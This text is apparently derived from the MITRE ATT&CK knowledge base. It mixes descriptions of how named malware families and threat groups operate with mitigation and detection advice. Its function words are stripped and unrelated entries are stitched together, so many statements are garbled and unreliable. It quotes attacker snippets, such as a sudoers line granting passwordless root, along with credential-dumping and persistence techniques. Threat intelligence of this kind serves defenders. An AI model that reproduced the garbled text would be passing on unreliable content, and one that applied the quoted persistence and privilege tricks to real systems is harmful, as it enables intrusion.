Information acquired Windows management tools [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) [PowerShell](https://attack.mitre.org/techniques/T1059/001). [ZxShell](https://attack.mitre.org/software/S0412) FTP C2 connections.(Citation: Talos ZxShell Oct 2014)  Monitoring module loads, explicitly included import tables, highlight obfuscated API function calls. Dynamic malware analysis expose signs function obfuscation, memory reads correspond addresses API function code modules.(Citation: BlackHat API Packers) [Lizar](https://attack.mitre.org/software/S0681) download additional plugins, files, tools.(Citation: BiZone Lizar 2021) [Rocke](https://attack.mitre.org/groups/G0106)'s miner created UPX-packed files Windows Start Menu Folder.(Citation: Talos Rocke August 2018)	 [Higaisa](https://attack.mitre.org/groups/G0126) payload creates hidden window.(Citation: PTSecurity Higaisa 2020) Network segmentation isolate infrastructure components require broad network access. mitigate, alleviate, scope AiTM activity. [Zox](https://attack.mitre.org/software/S0672) ability upload files targeted system.(Citation: Novetta-Axiom) Monitor windows registry values unexpected modifications [FIN8](https://attack.mitre.org/groups/G0061) HTTPS command control.(Citation: Bitdefender FIN8 July 2021) [Caterpillar WebShell](https://attack.mitre.org/software/S0572) upload files C2 channel.(Citation: ClearSky Lebanese Cedar Jan 2021)  [APT39](https://attack.mitre.org/groups/G0087) utilized AutoIt custom scripts perform internal reconnaissance.(Citation: FireEye APT39 Jan 2019)(Citation: FBI FLASH APT39 September 2020) Monitor logs actions gather cloud accounts, including calls cloud APIs perform account discovery.

System network discovery techniques occur operation adversary learns environment, extent normal network operations. discovery data events viewed isolation, chain behavior lead activities, Lateral Movement, based obtained. [Dok](https://attack.mitre.org/software/S0281) adds <code>admin  ALL=(ALL) NOPASSWD: ALL</code> <code>/etc/sudoers</code> file.(Citation: hexed osx.dok analysis 2019) [DarkComet](https://attack.mitre.org/software/S0334) disable Security Center functions Windows Firewall.(Citation: TrendMicro DarkComet Sept 2014)(Citation: Malwarebytes DarkComet March 2018) [APT29](https://attack.mitre.org/groups/G0016) spearphishing link trick victims clicking link zip file malicious files.(Citation: Mandiant Easy Breach)(Citation: MSTIC NOBELIUM 2021)(Citation: Secureworks IRON RITUAL USAID Phish 2021) [DarkWatchman](https://attack.mitre.org/software/S0673) collect files compromised host.(Citation: Prevailion DarkWatchman 2021) [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) writes collected data temporary file encrypted form exfiltration C2 server.(Citation: Symantec Dragonfly) Secure Boot prevent implementations modification code signing policies.(Citation: TESTSIGNING Feb 2021) [DarkComet](https://attack.mitre.org/software/S0334) active screen victim’s machine control mouse keyboard.(Citation: Malwarebytes DarkComet March 2018) [Wizard Spider](https://attack.mitre.org/groups/G0102) gained access credentials exported copies ntds.dit Active Directory database.(Citation: FireEye KEGTAP SINGLEMALT October 2020) [OilRig](https://attack.mitre.org/groups/G0049) created scheduled tasks VBScript execute payload victim machines.(Citation: Unit 42 OopsIE! Feb 2018)(Citation: Unit 42 QUADAGENT July 2018)(Citation: FireEye APT34 July 2019)(Citation: Check APT34 April 2021) [Psylo](https://attack.mitre.org/software/S0078) command download file C2 server.(Citation: Scarlet Mimic Jan 2016) [Mis-Type](https://attack.mitre.org/software/S0084) runs tests determine privilege level compromised user.(Citation: Cylance Dust Storm) [Gorgon Group](https://attack.mitre.org/groups/G0078) malware create .lnk file add Registry key establish persistence.(Citation: Unit 42 Gorgon Aug 2018) limiting cached credentials (HKLM\SOFTWARE\Microsoft\Windows NT\Current Version\Winlogon\cachedlogonscountvalue)(Citation: Tilbury Windows Credentials) Identify block malicious unknown .cpl files application whitelisting (Citation: Beechey 2010) tools, Windows Defender Application Control(Citation: Windows Defender Application Control), AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) [OSInfo](https://attack.mitre.org/software/S0165) Domain Admins power users domain.(Citation: Symantec Buckeye)  [MuddyWater](https://attack.mitre.org/groups/G0069) tools encode C2 communications including Base64 encoding.(Citation: ClearSky MuddyWater June 2019)(Citation: Trend Micro Muddy Water March 2021) [APT28](https://attack.mitre.org/groups/G0007) IMAP, POP3, SMTP communication channel implants, including self-registered Google Mail accounts compromised email servers victims.(Citation: FireEye APT28)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) Determine websites attachment types (ex: .scr, .exe, .pif, .cpl, etc.) phishing business operations blocking access activity monitored poses risk. [Pteranodon](https://attack.mitre.org/software/S0147) executes functions rundll32.exe.(Citation: Palo Alto Gamaredon Feb 2017) [ShimRat](https://attack.mitre.org/software/S0444) secondary C2 location unavailable.(Citation: FOX-IT 2016 Mofang)	 [NanoCore](https://attack.mitre.org/software/S0336) capability edit Registry.(Citation: DigiTrust NanoCore Jan 2017)(Citation: PaloAlto NanoCore Feb 2016) [GreyEnergy](https://attack.mitre.org/software/S0342) download additional modules payloads.(Citation: ESET GreyEnergy Oct 2018) [KGH_SPY](https://attack.mitre.org/software/S0526) send data C2 POST requests.(Citation: Cybereason Kimsuky November 2020) [Lizar](https://attack.mitre.org/software/S0681) collect email accounts Outlook Mozilla Thunderbird.(Citation: BiZone Lizar 2021)  [NETWIRE](https://attack.mitre.org/software/S0198) services including Paste.ee host payloads.(Citation: FireEye NETWIRE March 2019) Lateral movement [Net](https://attack.mitre.org/software/S0039) <code>net use</code> commands connect remote systems.(Citation: Savill 1999) [OilRig](https://attack.mitre.org/groups/G0049) automated collection.(Citation: Unit 42 Playbook Dec 2017) Network/Host intrusion prevention systems, antivirus, detonation chambers employed prevent documents fetching executing malicious payloads.(Citation: Anomali Template Injection MAR 2018) [NavRAT](https://attack.mitre.org/software/S0247) leverages cmd.exe perform discovery techniques.(Citation: Talos NavRAT 2018) [NavRAT](https://attack.mitre.org/software/S0247) loads malicious shellcode executes memory.(Citation: Talos NavRAT 2018) (Citation: DHS CISA AA22-055A MuddyWater February 2022) [Cardinal RAT](https://attack.mitre.org/software/S0348) injects newly spawned process created native Windows executable.(Citation: PaloAlto CardinalRat Apr 2017) [Wizard Spider](https://attack.mitre.org/groups/G0102) "ipconfig" identify network configuration victim machine.(Citation: Sophos Ryuk Attack October 2020) [Magic Hound](https://attack.mitre.org/groups/G0059) created user named `DefaultAccount` compromised machines assigned Administrators Remote Desktop Users groups.(Citation: DFIR Report APT35 ProxyShell March 2022) Windows:
Do user admin domain accounts local administrator systems tightly controlled, equivalent local administrator account password systems. Follow practices design administration enterprise network limit privileged account administrative tiers.(Citation: Securing Privileged Access)

Linux:
Scraping passwords memory requires root privileges. Follow practices restricting access privileged accounts avoid hostile programs accessing sensitive regions memory. [PolyglotDuke](https://attack.mitre.org/software/S0518) requests C2 communications.(Citation: ESET Dukes October 2019) [ZxShell](https://attack.mitre.org/software/S0412) injected shared SVCHOST process.(Citation: Talos ZxShell Oct 2014)  [Fox Kitten](https://attack.mitre.org/groups/G0117) named task reverse proxy lpupdate legitimate.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [LAPSUS$](https://attack.mitre.org/groups/G1004) removed targeted organization's global admin accounts lock organization access.(Citation: MSTIC DEV-0537 Mar 2022) [Sidewinder](https://attack.mitre.org/groups/G0121) e-mails malicious attachments lead victims credential harvesting websites.(Citation: ATT Sidewinder January 2021)(Citation: Rewterz Sidewinder APT April 2020)(Citation: Cyble Sidewinder September 2020) [jRAT](https://attack.mitre.org/software/S0283) distributed HTA files JScript.(Citation: Kaspersky Adwind Feb 2016)	 [Dragonfly](https://attack.mitre.org/groups/G0035) dropped executed SecretsDump dump password hashes. ntds.dit domain controllers.(Citation: US-CERT TA18-074A)(Citation: Core Security Impacket) [APT28](https://attack.mitre.org/groups/G0007) renamed WinRAR utility avoid detection.(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) Monitor executed commands arguments indicators obfuscation suspicious syntax uninterpreted escape characters '''^''' '''"'''. Deobfuscation tools detect indicators files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016) [GALLIUM](https://attack.mitre.org/groups/G0093) <code>netstat -oan</code> victim network connections.(Citation: Cybereason Soft Cell June 2019) [PlugX](https://attack.mitre.org/software/S0013) adds key entries Registry establish persistence.(Citation: Lastline PlugX Analysis)(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: CIRCL PlugX March 2013) [BADNEWS](https://attack.mitre.org/software/S0128) capable executing commands cmd.exe.(Citation: Forcepoint Monsoon)(Citation: TrendMicro Patchwork Dec 2017) [HermeticWiper](https://attack.mitre.org/software/S0697) compress 32-bit 64-bit driver files Lempel-Ziv algorithm.(Citation: Symantec Ukraine Wipers February 2022)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Qualys Hermetic Wiper March 2022) [UPPERCUT](https://attack.mitre.org/software/S0275) download upload files victim’s machine.(Citation: FireEye APT10 Sept 2018) [Amadey](https://attack.mitre.org/software/S1025) download execute files infect host machine additional malware.(Citation: BlackBerry Amadey 2020) [BLINDINGCAN](https://attack.mitre.org/software/S0520) loaded executed DLLs memory runtime victim machine.(Citation: US-CERT BLINDINGCAN Aug 2020) [Gelsemium](https://attack.mitre.org/software/S0666) collect data compromised host.(Citation: ESET Gelsemium June 2021) [Micropsia](https://attack.mitre.org/software/S0339) obfuscates configuration custom Base64 XOR.(Citation: Talos Micropsia June 2017)(Citation: Radware Micropsia July 2018) [CookieMiner](https://attack.mitre.org/software/S0492) checked presence "Little Snitch", macOS network monitoring application firewall software, stopping exiting found.(Citation: Unit42 CookieMiner Jan 2019) (Citation: Mandiant FIN5 GrrCON Oct 2016) [Attor](https://attack.mitre.org/software/S0438) manipulated time access files registry created modified.(Citation: ESET Attor Oct 2019) [Gamaredon Group](https://attack.mitre.org/groups/G0047) tools delete files folders victims' desktops profiles.(Citation: CERT-EE Gamaredon January 2021) LSA Protection enabled, monitor event logs (Events 3033 3063) failed attempts load LSA plug-ins drivers. (Citation: LSA Protection Mar 2014) Utilize Sysinternals Autoruns/Autorunsc utility (Citation: TechNet Autoruns) examine loaded drivers LSA. [Cardinal RAT](https://attack.mitre.org/software/S0348) uninstall itself, including deleting executable.(Citation: PaloAlto CardinalRat Apr 2017) restrict access unneeded scripting components. [SysUpdate](https://attack.mitre.org/software/S0663) delete configuration file targeted system.(Citation: Trend Micro Iron Tiger April 2021) [Machete](https://attack.mitre.org/software/S0409) TLS-encrypted FTP exfiltrate data.(Citation: Cylance Machete Mar 2017) [Rocke](https://attack.mitre.org/groups/G0106) changed file permissions files modified.(Citation: Anomali Rocke March 2019)	 [Derusbi](https://attack.mitre.org/software/S0021) capable deleting files. observed loading Linux Kernel Module (LKM) deleting hard disk overwriting data bytes.(Citation: Fidelis Turbo)(Citation: FireEye Periscope March 2018) Monitor executed commands arguments actions attempt access detailed password policy enterprise network cloud environment. network devices, monitor executed commands AAA logs, unexpected unauthorized users. multi-factor authentication user privileged accounts. [Chaes](https://attack.mitre.org/software/S0631) persistence Registry key <code>software\microsoft\windows\currentversion\run\microsoft windows help</code>.(Citation: Cybereason Chaes Nov 2020) [Attor](https://attack.mitre.org/software/S0438)'s dispatcher inject running processes gain privileges evade detection.(Citation: ESET Attor Oct 2019) [SombRAT](https://attack.mitre.org/software/S0615) store harvested data custom database %TEMP% directory.(Citation: BlackBerry CostaRicto November 2020) [LAPSUS$](https://attack.mitre.org/groups/G1004) gathered user identities credentials gain initial access victim's organization; called organization's desk reset target's credentials.(Citation: MSTIC DEV-0537 Mar 2022) [FIN6](https://attack.mitre.org/groups/G0037) Comodo code-signing certificates.(Citation: Security Intelligence Eggs Aug 2019)	 [HiddenWasp](https://attack.mitre.org/software/S0394) script automate tasks victim's machine assist execution.(Citation: Intezer HiddenWasp Map 2019) [OceanSalt](https://attack.mitre.org/software/S0346) collect process running system.(Citation: McAfee Oceansalt Oct 2018) [APT38](https://attack.mitre.org/groups/G0082) Task Scheduler programs startup scheduled basis persistence.(Citation: CISA AA20-239A BeagleBoyz August 2020) [FIN6](https://attack.mitre.org/groups/G0037) RDP laterally victim networks.(Citation: FireEye FIN6 April 2016)(Citation: FireEye FIN6 Apr 2019) [RCSession](https://attack.mitre.org/software/S0662) remove files targeted system.(Citation: Profero APT27 December 2020) [Clop](https://attack.mitre.org/software/S0611) code signing evade detection.(Citation: Unit42 Clop April 2021)  [ZxShell](https://attack.mitre.org/software/S0412) launch reverse command shell.(Citation: FireEye APT41 Aug 2019)(Citation: Talos ZxShell Oct 2014)(Citation: Secureworks BRONZEUNION Feb 2019) [HTTPBrowser](https://attack.mitre.org/software/S0070) capable listing files, folders, drives victim.(Citation: Dell TG-3390)(Citation: ZScaler Hacking Team) (Citation: FireEye APT17) multi-factor authentication accounts application deployment software. [WEBC2](https://attack.mitre.org/software/S0109) download execute file.(Citation: Mandiant APT1) [Mis-Type](https://attack.mitre.org/software/S0084) create file command <code>cmd.exe /c user {Username}</code>.(Citation: Cylance Dust Storm) [Chimera](https://attack.mitre.org/groups/G0114) performed file deletion evade detection.(Citation: Cycraft Chimera April 2020)  [BendyBear](https://attack.mitre.org/software/S0574) load execute modules Windows Application Programming (API) calls standard shellcode API hashing.(Citation: Unit42 BendyBear Feb 2021) [LiteDuke](https://attack.mitre.org/software/S0513) ability download files.(Citation: ESET Dukes October 2019) (Citation: MSTIC NOBELIUM Mar 2021)(Citation: Cybersecurity Advisory SVR TTP 2021)(Citation: MSTIC Nobelium Toolset 2021)(Citation: Secureworks IRON RITUAL Profile) [Cobalt Strike](https://attack.mitre.org/software/S0154) custom command control protocol encapsulated HTTPS. protocols standard assigned ports.(Citation: cobaltstrike manual)(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020)(Citation: Securelist APT10 March 2021) [APT28](https://attack.mitre.org/groups/G0007) exploited Windows SMB Remote Code Execution Vulnerability conduct lateral movement.(Citation: FireEye APT28)(Citation: FireEye APT28 Hospitality Aug 2017)(Citation: MS17-010 March 2017) [Koadic](https://attack.mitre.org/software/S0250) gather hashed passwords gathering domain controller hashes NTDS.(Citation: Github Koadic) [Bankshot](https://attack.mitre.org/software/S0239) gathers domain account names/information process monitoring.(Citation: McAfee Bankshot) [LAPSUS$](https://attack.mitre.org/groups/G1004) exploited unpatched vulnerabilities internally accessible servers including JIRA, GitLab, Confluence privilege escalation.(Citation: MSTIC DEV-0537 Mar 2022) Monitor processes executed removable media malicious abnormal activity network connections Command Control network Discovery techniques. (Citation: FireEye admin@338) [C0010](https://attack.mitre.org/campaigns/C0010), UNC3890 actors unique malware, including [SUGARUSH](https://attack.mitre.org/software/S1049) [SUGARDUMP](https://attack.mitre.org/software/S1042).(Citation: Mandiant UNC3890 Aug 2022) [Earth Lusca](https://attack.mitre.org/groups/G1006) `mshta.exe` load HTA script malicious .LNK file.(Citation: TrendMicro EarthLusca 2022) [Kevin](https://attack.mitre.org/software/S1020) renamed image `cmd.exe` execution.(Citation: Kaspersky Lyceum October 2021) (Citation: FireEye APT33 Sept 2017)(Citation: FireEye APT33 Webinar Sept 2017)(Citation: Symantec Elfin Mar 2019) [AADInternals](https://attack.mitre.org/software/S0677) create SAML tokens Federated Services token signing certificate.(Citation: AADInternals Documentation) Monitor executed commands arguments abuse time providers execute DLLs boots. [Ramsay](https://attack.mitre.org/software/S0458) masqueraded JPG image file.(Citation: Eset Ramsay 2020) (Citation: ATT TeamTNT Chimaera September 2020) [Earth Lusca](https://attack.mitre.org/groups/G1006) [Nltest](https://attack.mitre.org/software/S0359) domain controllers.(Citation: TrendMicro EarthLusca 2022) (Citation: ClearkSky Fox Kitten February 2020)(Citation: Check Pay2Key November 2020) [Gazer](https://attack.mitre.org/software/S0168) custom encryption C2 3DES.(Citation: ESET Gazer Aug 2017)(Citation: Securelist WhiteBear Aug 2017) [AADInternals](https://attack.mitre.org/software/S0677) gather tenant’s domains public APIs.(Citation: AADInternals Documentation)(Citation: Azure Recon) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) spoofed legitimate applications phishing lures changed file extensions conceal  installation malware.(Citation: Google Election Threats October 2020)(Citation: Zscaler APT31 Covid-19 October 2020) (Citation: FireEye APT37 Feb 2018) (Citation: POLONIUM June 2022) [MuddyWater](https://attack.mitre.org/groups/G0069) C2 enumeration scripts monitor logs, C2 send data back.(Citation: Talos MuddyWater 2019)  [EKANS](https://attack.mitre.org/software/S0605) stops database, data backup solution, antivirus, ICS-related processes.(Citation: Dragos EKANS)(Citation: FireEye Ransomware Feb 2020)(Citation: Palo Alto Unit 42 EKANS) Azure Administrators apply limitations ability users grant consent unfamiliar unverified third-party applications.  [Cobalt Strike](https://attack.mitre.org/software/S0154) RSA asymmetric encryption PKCS1 padding encrypt data C2 server.(Citation: Talos Cobalt Strike September 2020) [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors encoded payloads single-byte XOR, skipping key zeroing attempt avoid exposing key; payloads Base64-encoded.(Citation: Cylance Dust Storm) [BLINDINGCAN](https://attack.mitre.org/software/S0520) lured victims executing malicious macros embedded Office documents.(Citation: US-CERT BLINDINGCAN Aug 2020) [Fox Kitten](https://attack.mitre.org/groups/G0117) prodump dump credentials LSASS.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [PowerShower](https://attack.mitre.org/software/S0441) POST requests C2 servers send receive instructions.(Citation: Unit 42 Inception November 2018) [Rocke](https://attack.mitre.org/groups/G0106) detect running process's PID infected machine.(Citation: Anomali Rocke March 2019)	 [Cannon](https://attack.mitre.org/software/S0351) collect current time zone victim’s machine.(Citation: Unit42 Cannon Nov 2018) [HEXANE](https://attack.mitre.org/groups/G1001) staged malware fraudulent websites set impersonate targeted organizations.(Citation: ClearSky Siamesekitten August 2021) [Egregor](https://attack.mitre.org/software/S0554) encrypt non-system files hybrid AES-RSA algorithm prior displaying ransom note.(Citation: NHS Digital Egregor Nov 2020)(Citation: Cybereason Egregor Nov 2020)  [HAMMERTOSS](https://attack.mitre.org/software/S0037) PowerShell.(Citation: FireEye APT29) [Sakula](https://attack.mitre.org/software/S0074) calls cmd.exe DLL files rundll32 perform file cleanup. [Sakula](https://attack.mitre.org/software/S0074) capability invoke reverse shell.(Citation: Dell Sakula) [SOUNDBITE](https://attack.mitre.org/software/S0157) communicates DNS C2.(Citation: FireEye APT32 2017) Anti-virus automatically quarantine suspicious files. [Agent Tesla](https://attack.mitre.org/software/S0331) ability decrypt strings encrypted Rijndael symmetric encryption algorithm.(Citation: Malwarebytes Agent Tesla April 2020) (Citation: Scarlet Mimic Jan 2016) [MacMa](https://attack.mitre.org/software/S1016) decrypts downloaded file AES-128-EBC custom delta.(Citation: ESET DazzleSpy Jan 2022) Properly manage accounts permissions parties trusted relationships minimize potential abuse party party compromised adversary. Office 365 environments, partner relationships roles viewed “Partner Relationships” page.(Citation: Office 365 Partner Relationships)
 [XTunnel](https://attack.mitre.org/software/S0117) capable probing network ports.(Citation: Invincea XTunnel) Traffic anonymity networks C2 infrastructure blocked network block lists. blocking circumvented techniques [Domain Fronting](https://attack.mitre.org/techniques/T1090/004). Leverage services Content Delivery Networks (CDN) providers specializing DoS mitigations filter traffic upstream services.(Citation: CERT-EU DDoS March 2017) Filter boundary traffic blocking source addresses sourcing attack, blocking ports targeted, blocking protocols transport. defend SYN floods, enable SYN Cookies. [EXOTIC LILY](https://attack.mitre.org/groups/G1011) searched targeted individuals business databases including RocketReach CrunchBase.(Citation: Google EXOTIC LILY March 2022) [Rocke](https://attack.mitre.org/groups/G0106) installed systemd service script maintain persistence.(Citation: Anomali Rocke March 2019)	 [Turian](https://attack.mitre.org/software/S0647) retrieve internal IP address compromised host.(Citation: ESET BackdoorDiplomacy Jun 2021) [BLUELIGHT](https://attack.mitre.org/software/S0657) zip files exfiltration.(Citation: Volexity InkySquid BLUELIGHT August 2021) Deny direct remote access internal systems network proxies, gateways, firewalls. [ShadowPad](https://attack.mitre.org/software/S0596) FTP C2 communications.(Citation: Kaspersky ShadowPad Aug 2017) [AADInternals](https://attack.mitre.org/software/S0677) check existence user email addresses public APIs.(Citation: AADInternals Documentation)(Citation: Azure Recon) [APT32](https://attack.mitre.org/groups/G0050)'s macOS backdoor permission file execute 755.(Citation: ESET OceanLotus macOS April 2019) executable dropped victims [Putter Panda](https://attack.mitre.org/groups/G0024) aims inject DLL process accessing network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), Firefox (firefox.exe).(Citation: CrowdStrike Putter Panda) Monitor newly constructed registry values aid persistence execution.  Employ heuristic-based malware detection. Ensure updated virus definitions create custom signatures observed malware.  [Earth Lusca](https://attack.mitre.org/groups/G1006) megacmd tool upload stolen files victim network MEGA.(Citation: TrendMicro EarthLusca 2022) domain joined, policy restrict ability create hide users. Similarly, preventing modification <code>/Library/Preferences/com.apple.loginwindow</code> <code>Hide500Users</code> force users visible. [Bisonal](https://attack.mitre.org/software/S0268) RegQueryValueExA function retrieve proxy Registry.(Citation: Talos Bisonal Mar 2020) (Citation: Symantec RAINDROP January 2021)(Citation: MSTIC Nobelium Toolset 2021)(Citation: Secureworks IRON RITUAL Profile) [httpclient](https://attack.mitre.org/software/S0068) command control.(Citation: CrowdStrike Putter Panda) Monitor network traffic originating unknown/unexpected hardware devices.  Monitoring DLL module loads generate data defense collected specific circumstances, benign Windows modules load functions common difficult distinguish malicious behavior. Legitimate software load routine, bundled DLL modules Windows DLLs deviation module loads suspicious. Limiting DLL module loads <code>%SystemRoot%</code> <code>%ProgramFiles%</code> directories protect module loads unsafe paths. [SMOKEDHAM](https://attack.mitre.org/software/S0649) source code embedded dropper encrypted string.(Citation: FireEye SMOKEDHAM June 2021) Monitor API calls gather time time zone local remote system. Remote access tools built-in features interact Windows API gather information. [Chrommme](https://attack.mitre.org/software/S0667) Windows API including `WinExec` execution.(Citation: ESET Gelsemium June 2021) [LookBack](https://attack.mitre.org/software/S0582) removes execution delete files system.(Citation: Proofpoint LookBack Malware Aug 2019) [FIN10](https://attack.mitre.org/groups/G0051) RDP laterally systems victim environment.(Citation: FireEye FIN10 June 2017) [APT32](https://attack.mitre.org/groups/G0050)'s backdoor Windows services execute malicious payload. (Citation: ESET OceanLotus Mar 2019) [DealersChoice](https://attack.mitre.org/software/S0243) modifications open-source scripts GitHub executes victim’s machine.(Citation: Sofacy DealersChoice) [Volgmer](https://attack.mitre.org/software/S0180) variants SSL encrypt C2 communications.(Citation: US-CERT Volgmer Nov 2017) [Saint Bot](https://attack.mitre.org/software/S1018) conducted locale checks compromised host Russia, Ukraine, Belarus, Armenia, Kazakhstan, Moldova.(Citation: Malwarebytes Saint Bot April 2021)(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [CozyCar](https://attack.mitre.org/software/S0046) dropper masqueraded infected system's rundll32.exe executable moved malware's install directory renamed predefined configuration file.(Citation: F-Secure CozyDuke) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) gained initial access exploiting CVE-2019-18935, vulnerability Telerik UI ASP.NET AJAX.(Citation: RedCanary Mockingbird 2020) Restrict administrator accounts individuals possible, privilege principles.  Prevent credential overlap systems administrator privileged accounts, network non-network platforms, servers endpoints. [Magic Hound](https://attack.mitre.org/groups/G0059) malware list running processes.(Citation: Unit 42 Magic Hound Feb 2017) (Citation: ESET LightNeuron 2019)(Citation: Secureworks IRON HUNTER Profile) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors [at](https://attack.mitre.org/software/S0110) execute droppers.(Citation: McAfee Night Dragon) [Kevin](https://attack.mitre.org/software/S1020) generate sequence dummy C2 requests obscure traffic.(Citation: Kaspersky Lyceum October 2021) [Explosive](https://attack.mitre.org/software/S0569) function download file infected system.(Citation: CheckPoint Volatile Cedar March 2015)  [Kevin](https://attack.mitre.org/software/S1020) Base64-encoded configuration file.(Citation: Kaspersky Lyceum October 2021) (Citation: ESET Dukes October 2019)(Citation: Secureworks IRON HEMLOCK Profile) Monitor executed commands arguments search common password storage locations user credentials. (Citation: FireEye APT30) [APT33](https://attack.mitre.org/groups/G0064) FTP exfiltrate files (separately C2 channel).(Citation: Symantec Elfin Mar 2019) [APT28](https://attack.mitre.org/groups/G0007) UEFI (Unified Extensible Firmware Interface) rootkit [LoJax](https://attack.mitre.org/software/S0397).(Citation: Symantec APT28 Oct 2018)(Citation: ESET LoJax Sept 2018) [WellMail](https://attack.mitre.org/software/S0515) decompress scripts received C2.(Citation: CISA WellMail July 2020) Periodically baseline registered SIPs trust providers (Registry entries files disk), new, modified, non-Microsoft entries.(Citation: SpectorOps Subverting Trust Sept 2017) analyze Autoruns data oddities anomalies, malicious files attempting persistent execution hiding auto-starting locations. Autoruns hide entries signed Windows default, ensure “Hide Entries” “Hide Windows Entries” deselected.(Citation: SpectorOps Subverting Trust Sept 2017) [Denis](https://attack.mitre.org/software/S0354) <code>IsDebuggerPresent</code>, <code>OutputDebugString</code>, <code>SetLastError</code> APIs avoid debugging. [Denis](https://attack.mitre.org/software/S0354) <code>GetProcAddress</code> <code>LoadLibrary</code> dynamically resolve APIs. [Denis](https://attack.mitre.org/software/S0354) <code>Wow64SetThreadContext</code> API process hollowing process.(Citation: Cybereason Cobalt Kitty 2017)	 [Kivars](https://attack.mitre.org/software/S0437) ability remotely trigger keyboard input mouse clicks. (Citation: TrendMicro BlackTech June 2017) [DRATzarus](https://attack.mitre.org/software/S0694)'s dropper packed UPX.(Citation: ClearSky Lazarus Aug 2020) [Kimsuky](https://attack.mitre.org/groups/G0094) staged collected data files <code>C:\Program Files\Common Files\System\Ole DB\</code>.(Citation: CISA AA20-301A Kimsuky)(Citation: Talos Kimsuky Nov 2021) Segregate SNMP traffic separate management network.(Citation: US-CERT TA17-156A SNMP Abuse 2017) [APT39](https://attack.mitre.org/groups/G0087) utilized tools aggregate data prior exfiltration.(Citation: FBI FLASH APT39 September 2020) embedded network devices capable storing passwords local accounts plain-text encrypted formats.  Ensure that, available, local passwords encrypted, vendor recommendations. (Citation: Cisco IOS Software Integrity Assurance - Credentials Management) [CharmPower](https://attack.mitre.org/software/S0674) `netsh wlan profiles` list specific Wi-Fi profile details.(Citation: Check APT35 CharmPower January 2022) [ZeroT](https://attack.mitre.org/software/S0230) C2.(Citation: Proofpoint TA459 April 2017)(Citation: Proofpoint ZeroT Feb 2017) Monitor third-party application logging, messaging, artifacts leverage repositories valuable information. repositories considerably user base, detection malicious non-trivial. minimum, access repositories performed privileged users (for example, Active Directory Domain, Enterprise, Schema Administrators) closely monitored alerted upon, types accounts access repositories. capability exists, monitor alert users retrieving viewing documents pages; behavior indicative programmatic retrieve data repository. environments high-maturity, leverage User-Behavioral Analytics (UBA) platforms detect alert user based anomalies. (Citation: DOJ APT10 Dec 2018)(Citation: Symantec Cicada November 2020)(Citation: Securelist APT10 March 2021) Monitor newly executed processes attempt access detailed password policy enterprise network cloud environment. [Sidewinder](https://attack.mitre.org/groups/G0121) PowerShell drop execute malware loaders.(Citation: ATT Sidewinder January 2021) (Citation: Symantec Leafminer July 2018) [Pandora](https://attack.mitre.org/software/S0664) ability install Windows service.(Citation: Trend Micro Iron Tiger April 2021) [gh0st RAT](https://attack.mitre.org/software/S0032) capability list processes.(Citation: FireEye Hacking Team) [Daserf](https://attack.mitre.org/software/S0187) steganography hide malicious code downloaded victim.(Citation: Trend Micro Daserf Nov 2017) [FIN4](https://attack.mitre.org/groups/G0085) victims spoofed Windows Authentication prompts collect credentials.(Citation: FireEye Hacking FIN4 Dec 2014)(Citation: FireEye Hacking FIN4 Video Dec 2014) [Matryoshka](https://attack.mitre.org/software/S0167) capable performing screen captures.(Citation: ClearSky Wilted Tulip July 2017)(Citation: CopyKittens Nov 2015) [Moses Staff](https://attack.mitre.org/groups/G1009) obfuscated shells operations.(Citation: Checkpoint MosesStaff Nov 2021) [HotCroissant](https://attack.mitre.org/software/S0431) ability list running processes infected host.(Citation: Carbon Black HotCroissant April 2020) [Kimsuky](https://attack.mitre.org/groups/G0094) e-mail send exfiltrated data C2 servers.(Citation: CISA AA20-301A Kimsuky) Monitor newly constructed services abuse control manager execute malicious commands payloads. [Earth Lusca](https://attack.mitre.org/groups/G1006) Fodhelper UAC bypass technique gain elevated privileges.(Citation: TrendMicro EarthLusca 2022) [HEXANE](https://attack.mitre.org/groups/G1001) targeted executives, human resources staff, personnel spearphishing.(Citation: SecureWorks August 2019)(Citation: ClearSky Siamesekitten August 2021)
 Users trained identify social engineering techniques spearphishing attempts. process monitoring monitor execution arguments Regsvcs.exe Regasm.exe. Compare invocations Regsvcs.exe Regasm.exe prior history arguments executed binaries determine anomalous adversarial activity. (Citation: FireEye Maze 2020) [Aria-body](https://attack.mitre.org/software/S0456) ability duplicate token ntprint.exe.(Citation: CheckPoint Naikon 2020) Windows 10, enable Attack Surface Reduction (ASR) rules prevent Office applications creating child processes writing malicious executable content disk. (Citation: win10_asr) [FIN10](https://attack.mitre.org/groups/G0051) PowerShell execution PowerShell Empire establish persistence.(Citation: FireEye FIN10 June 2017)(Citation: Github PowerShell Empire) executable version [Helminth](https://attack.mitre.org/software/S0170) module log clipboard contents.(Citation: Palo Alto OilRig 2016) [RTM](https://attack.mitre.org/groups/G0048) RSS feed Livejournal update list encrypted C2 server names.(Citation: ESET RTM Feb 2017) Ensure SSH key pairs strong passwords refrain key-store technologies ssh-agent properly protected. [Patchwork](https://attack.mitre.org/groups/G0040) removed files replaced retrieved.(Citation: TrendMicro Patchwork Dec 2017) Malware [Ke3chang](https://attack.mitre.org/groups/G0004) commands command-line interface.(Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC APT15 Alive Strong) Monitor executed commands arguments search Registry compromised systems insecurely stored credentials. [Ke3chang](https://attack.mitre.org/groups/G0004) right-to-left override character spearphishing attachment names trick targets executing .scr .exe files.(Citation: Mandiant Operation Ke3chang November 2014) 